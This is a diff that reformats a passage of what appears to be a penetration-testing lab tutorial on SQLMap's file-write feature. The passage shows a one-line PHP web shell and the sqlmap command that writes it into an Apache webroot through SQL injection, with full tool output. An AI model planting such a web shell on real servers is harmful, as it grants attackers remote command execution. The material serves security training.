@@ -1972,13 +1972,35 @@ This is why modern DBMSes disable file-write by default and need certain privile
 
 Still, many web applications require the ability for DBMSes to write data into files, so it is worth testing whether we can write files to the remote server. To do that with SQLMap, we can use the `--file-write` and `--file-dest` options. First, let's prepare a basic PHP web shell and write it into a `shell.php` file:
 
-shell
-`adampueman@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php`
+```shell
+adampueman@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
+```
 
 Now, let's attempt to write this file on the remote server, in the `/var/www/html/` directory, the default server webroot for Apache. If we didn't know the server webroot, we will see how SQLMap can automatically find it.
 
-shell
-`adampueman@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"         ___       __H__ ___ ___[']_____ ___ ___  {1.4.11#stable} |_ -| . [(]     | .'| . | |___|_  [,]_|_|_|__,|  _|       |_|V...       |_|   http://sqlmap.org [*] starting @ 17:54:18 /2020-11-19/ [17:54:19] [INFO] resuming back-end DBMS 'mysql' [17:54:19] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: ...SNIP... do you want confirmation that the local file 'shell.php' has been successfully written on the back-end DBMS file system ('/var/www/html/shell.php')? [Y/n] y [17:54:28] [INFO] the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B) [*] ending @ 17:54:28 /2020-11-19/`
+```shell
+adampueman@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
+
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.4.11#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+[*] starting @ 17:54:18 /2020-11-19/
+
+[17:54:19] [INFO] resuming back-end DBMS 'mysql'
+[17:54:19] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+...SNIP...
+do you want confirmation that the local file 'shell.php' has been successfully written on the back-end DBMS file system ('/var/www/html/shell.php')? [Y/n] y
+
+[17:54:28] [INFO] the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)
+
+[*] ending @ 17:54:28 /2020-11-19/
+```
 
 We see that SQLMap confirmed that the file was indeed written:
 
